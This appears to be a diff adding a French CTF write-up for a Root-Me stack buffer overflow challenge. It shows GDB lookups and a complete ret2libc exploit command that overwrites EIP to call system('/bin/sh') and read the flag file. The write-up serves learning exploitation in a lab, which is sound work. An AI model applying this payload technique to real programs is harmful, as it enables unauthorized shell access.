@@ -1,0 +1,53 @@
+---
+title: "ELF x86 - Stack buffer overflow basic 6"
+description: "WriteUp - Medium"
+pubDate: "May 12 2024"
+image: /image/image4.jpg
+categories:
+  - rootme
+tags:
+  - app-system
+  - buffer-overflow
+  - stack
+---
+
+D'après l'intitulé du défi, il semble s'agir d'un buffer overflow ret2libc.
+Nous ne pouvons pas afficher l'adresse du buffer dans GDB car les symboles sont désactivés. Par conséquent, nous devons déterminer combien d'octets sont nécessaires pour écraser l'adresse de l'Instruction Pointer (EIP), sachant que notre tampon fait 20 octets. L'écrasement de l'EIP se produit après 32 octets.
+
+```bash
+app-systeme-ch33@challenge02:~$ ./ch33 $(python -c "print 'A'*31")
+Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+app-systeme-ch33@challenge02:~$ ./ch33 $(python -c "print 'A'*32")
+Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Erreur de segmentation
+```
+À ce stade la, il me manque l'adresse de system, l'adresse de "/bin/sh" et l'adresse de exit afin de réaliser le ret2libc proprement, pour ce faire j'utilise GDB.\\
+On peut facilement trouver les adresses de `system` et de `exit` de la manière suivante :
+
+```bash
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7e67310 <system>
+```
+
+```bash
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xb7e5a260 <exit>
+```
+
+Ensuite, en utilisant la commande info files dans GDB, je trouve la section .rodata, ce qui me permet par la suite de trouver l'adresse de la chaîne "/bin/sh". 
+
+```bash
+0xb7f73040 - 0xb7f94b04 
+    is .rodata in /libold/i386-linux-gnu/libc.so.6
+(gdb) find 0xb7f73040, 0xb7f94b04, "/bin/sh"
+0xb7f89d4c
+```
+
+Enfin, je peux créer l'exploit suivant avec la structure : padding + adresse de system + adresse de exit + adresse de "/bin/sh" + argument pour exit.
+
+```bash
+./ch33 $(python -c "print 'A'*32 + '\x10\x73\xe6\xb7' + \
+    '\x60\xa2\xe5\xb7' + '\x4c\x9d\xf8\xb7' + \
+        '\x01\x01\x01\x01'")
+$ cat .passwd             
+```
